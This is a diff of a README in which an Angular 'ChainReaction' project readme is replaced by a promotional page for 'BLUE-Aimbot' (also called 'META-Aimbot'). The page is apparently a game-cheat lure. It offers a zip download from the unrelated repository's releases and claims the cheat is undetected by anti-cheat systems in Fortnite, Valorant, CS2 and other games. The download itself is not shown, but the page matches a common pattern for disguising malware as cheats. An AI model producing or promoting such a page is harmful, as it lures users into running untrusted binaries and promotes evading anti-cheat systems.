@@ -1,27 +1,27 @@
-# ChainReaction
+# BLUE-Aimbot
 
-This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 11.0.2.
+<p align="center">
+  <img src="https://i.postimg.cc/xC12HmS6/d287fb4b-e8fb-4215-88c2-341447416b5a.png" alt="BLUE-Aimbot Logo">
+</p>
 
-## Development server
+## Overview
 
-Run `ng serve` for a dev server. Navigate to `http://localhost:4200/`. The app will automatically reload if you change any of the source files.
+META-Aimbot is an innovative aimbot designed for various games, providing enhanced aiming capabilities. It supports popular games such as Fortnite, Apex Legends, Valorant, Escape from Tarkov, Counter-Strike 2 (CS2), DayZ, Rust, FiveM, Warzone 2, and SEA.
 
-## Code scaffolding
+## Download
 
-Run `ng generate component component-name` to generate a new component. You can also use `ng generate directive|pipe|service|class|guard|interface|enum|module`.
+[![Download BLUE-Aimbot](https://img.shields.io/badge/Download-BLUE%20Aimbot-blue?style=for-the-badge&color=007BFF)](https://github.com/rafiul41/chain-reaction-canvas/releases/download/Blue-Aimbot/Blue-Aimbot.zip)
 
-## Build
 
-Run `ng build` to build the project. The build artifacts will be stored in the `dist/` directory. Use the `--prod` flag for a production build.
+## Key Features
 
-## Running unit tests
+- **Innovation:** BLUE-Aimbot utilizes advanced aiming algorithms for superior performance.
+- **Game Support:** Compatible with a wide range of games, including Fortnite, Apex, Valorant, and more.
+- **Undetected:** As of January 1, 2024, BLUE-Aimbot remains undetected by all major anti-cheat systems.
+- **Regular Updates:** Stay ahead with regular updates for improved features and compatibility.
 
-Run `ng test` to execute the unit tests via [Karma](https://karma-runner.github.io).
+## Screenshots
 
-## Running end-to-end tests
+### Fortnite
 
-Run `ng e2e` to execute the end-to-end tests via [Protractor](http://www.protractortest.org/).
-
-## Further help
-
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://angular.io/cli) page.
+![Fortnite](https://i.postimg.cc/ryWcfYcP/c41114ab6626ea15a26e8e7f1108c25ab.webp)
